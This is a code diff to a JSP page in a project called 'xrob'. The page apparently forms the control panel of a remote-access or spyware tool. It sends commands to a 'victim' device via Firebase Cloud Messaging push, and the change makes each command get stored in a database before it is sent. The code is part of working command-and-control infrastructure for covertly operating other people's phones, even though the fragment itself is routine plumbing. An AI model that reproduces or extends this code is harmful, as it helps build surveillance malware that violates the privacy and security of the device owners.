@@ -6,6 +6,7 @@
 <%@ page import="com.theah64.xrob.api.models.Command" %>
 <%@ page import="com.theah64.xrob.api.database.tables.*" %>
 <%@ page import="com.theah64.xrob.api.utils.FCMUtils" %>
+<%@ page import="com.theah64.xrob.api.database.tables.command.Commands" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -91,8 +92,21 @@
                             try {
                                 if (command.matches(Command.REGEX_VALID_COMMAND)) {
 
-                                    final boolean isCommandSent = FCMUtils.sendPayload(Command.toFcmPayload(theVictim.getFCMId(), new Command("1", command, 0, null)));
-                                    System.out.println("Command sent: " + isCommandSent);
+                                    final Command commandOb = new Command(null, command, 0, null, theVictim.getId(), clientId.toString());
+                                    final String commandId = Commands.getInstance().addv3(commandOb);
+                                    if (commandId != null) {
+                                        commandOb.setId(commandId);
+                                        final boolean isCommandSent = FCMUtils.sendPayload(Command.toFcmPayload(theVictim.getFCMId(), commandOb));
+                                        if (isCommandSent) {
+
+                                        } else {
+                                            //TODO: Update command table
+                                            throw new Exception("Failed to send the command : " + command);
+                                        }
+                                    } else {
+                                        throw new Exception("Failed to save command : " + command);
+                                    }
+
                                 } else {
                                     throw new Exception("Invalid command :" + command);
                                 }
